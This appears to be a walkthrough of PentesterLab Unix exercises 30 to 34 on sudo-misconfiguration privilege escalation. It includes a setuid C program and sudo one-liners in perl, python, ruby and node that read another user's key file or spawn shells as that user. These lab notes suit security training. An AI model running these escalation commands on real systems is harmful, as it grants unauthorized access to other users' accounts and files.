* You can access this exercise using the following URL: [http://ptl-2d341e3e-9f527332.libcurl.so/](http://ptl-2d341e3e-9f527332.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-2d341e3e-9f527332.libcurl.so/](https://ptl-2d341e3e-9f527332.libcurl.so/).

# Unix 30

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, we are going to work on more privileges escalation based on misconfigurations of the `sudo` command. As before, you can use `sudo -l` to see what command you're authorized to run.

* Here we are going to solve this challenge by creating a `setgid` program. This program will run as the `victim` group once you run it, thanks to the `setgid bit`.

* You can see that a program is `setuid` or `setgid` by looking at its permissions:

	* `ls -l /usr/bin/password`
	* `-rwsr-xr-x 1 root root 54192 Nov 18 2015 /usr/bin/passwd`

* In this example, the program `/usr/bin/passwd` is `setuid` `root` as it will run as the user `root` even if it's started by another user. You can see the `setuid bit` in the output of `ls -l` with the `s` in the permissions (instead of `x` for non-setuid program). `Setuid root` are always a good target as they often allow `privileges escalation`.

* A few years ago, you could exploit this configuration issue by copying a `shell` (`bash` a long time ago and `ksh` more recently) and adding the `setuid bit` to it. [Un]fortunately most shells will now prevent this attack. But we can still do something similar by writing our own program.

* To create this program, you can use the following C code:
```
int main(void)
{
	system("cat /home/victim/key.txt");
}
```

* You can then compile it:
```
gcc -o /tmp/[FILE] [FILE].c
```
	* Where [FILE] is the filename.

* Then you will need to copy it using the `sudo`, this will allow you to create a file owned by the `victim` user. Once you copied it, you should be able to set the `setuid` and `setgid` flags on it using:

	* `chmod +xs [FILE]`
	* Where `[FILE]` is the filename.

* Now you can run this program as the `pentesterlab` and you should be able to get access to the `key.txt` file thanks to the `setgid bit`.

* You can access this exercise using the following URL: [http://ptl-35dbbe5b-87bff863.libcurl.so/](http://ptl-35dbbe5b-87bff863.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-35dbbe5b-87bff863.libcurl.so/](https://ptl-35dbbe5b-87bff863.libcurl.so/).

# Unix 31

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, we are going to work on more privileges escalation based on misconfigurations of the `sudo` command. As before, you can use `sudo -l` to see what command you're authorized to run.

* To solve this challenge, you will need to use `perl -e '...'` followed by valid `Perl` code. You can just use `print` and `backticks` to run a command and get its result. You will need to use this to get the content of the file `/home/victim/key.txt`. Otherwise, you can also spawn a shell running as victim by using `perl -e '...'` and `backticks`.

* ```$ sudo -u victim perl -e 'print `cat /home/victim/key.txt` '  ```
* works fine

* ```$ sudo -u victim perl -e "print `cat /home/victim/key.txt` "  ```
* permission denied, because  if you use `"` instead of `'` , first command in backticks are excuted way before the perl command,i.e, it run in current user context instead of victim.

* Hence use `'` instead of `"`.

* `$ sudo -u victim perl -e 'exec "/bin/bash"' ` for spawning new shell.

* You can access this exercise using the following URL: [http://ptl-78bb5af2-cfffbf9d.libcurl.so/](http://ptl-78bb5af2-cfffbf9d.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-78bb5af2-cfffbf9d.libcurl.so/](https://ptl-78bb5af2-cfffbf9d.libcurl.so/).

# Unix 32

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, we are going to work on more privileges escalation based on misconfigurations of the `sudo` command. As before, you can use `sudo -l` to see what command you're authorized to run.

* To solve this challenge, you will need to use the `python` command that will start a `REPL (A Read–Eval–Print Loop)`. From that you should be able to:
* import the `call` command from the subprocess module:
	* `from subprocess import call`

* run commands:
	* `call(['uname'])`

* You can also manage to get the same result using the `os` module and `os.system('uname')`.

* Using this information, you should be able to run command as the `victim` user and gain access to the key.

* `$ sudo -u victim python`

	* This will open `REPL` which is interactive python interpreter where you can run above mentions statments one by one.

* you can spawn a shell a follows

	* `$ sudo -u victim python -c 'import pty; pty.spawn("/bin/sh")'`

* You can access this exercise using the following URL: [http://ptl-a907f685-0741b789.libcurl.so/](http://ptl-a907f685-0741b789.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-a907f685-0741b789.libcurl.so/](https://ptl-a907f685-0741b789.libcurl.so/).

# Unix 33

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, we are going to work on more privileges escalation based on misconfigurations of the `sudo` command. As before, you can use `sudo -l` to see what command you're authorized to run.

* As we saw in the previous challenge, having a `REPL` is pretty handy. In `ruby`, you can start one using the following command:

* `/usr/bin/ruby -e 'require "irb" ; IRB.start(__FILE__)'`

* Once you have the `REPL` running, you should be able to run commands by using ``` `[COMMAND]` ``` (for example ``` `uname` ``` to run `uname`).

* ```$ sudo -u victim ruby -e 'puts `cat /home/victim/key.txt`'  ```

* `$ sudo -u victim ruby -e 'exec "/bin/sh"' `

* You can access this exercise using the following URL: [http://ptl-6bf04750-bc20041d.libcurl.so/](http://ptl-6bf04750-bc20041d.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-6bf04750-bc20041d.libcurl.so/](https://ptl-6bf04750-bc20041d.libcurl.so/).

# Unix 34

## Logging in

* In this challenge, you can log in using the `username: pentesterlab` and the `password: pentesterlab`.

## Challenge

* In this challenge, we are going to work on more privileges escalation based on misconfigurations of the `sudo` command. As before, you can use `sudo -l` to see what command you're authorized to run.

* To solve this challenge, you can use `node -e '...'` followed by valid `JavaScript` code.

* You can based your payload on the following snippet to get command execution:
```
var exec = require('child_process').exec;
exec('[COMMAND]', function (error, stdOut, stdErr) {
console.log(stdOut);
});
```

* `$ sudo -u victim node -e 'var exec = require("child_process").exec; exec("cat /home/victim/key.txt", function(error, stdOut, stdErr) {console.log(stdOut); });'`

* With this information, you should be able to read the `key.txt` file in the victim 's home directory.

* You can access this exercise using the following URL: [http://ptl-80590c3b-42b93837.libcurl.so/](http://ptl-80590c3b-42b93837.libcurl.so/). You can also use the TLS version if you're experiencing timeouts due to network filtering: [https://ptl-80590c3b-42b93837.libcurl.so/](https://ptl-80590c3b-42b93837.libcurl.so/).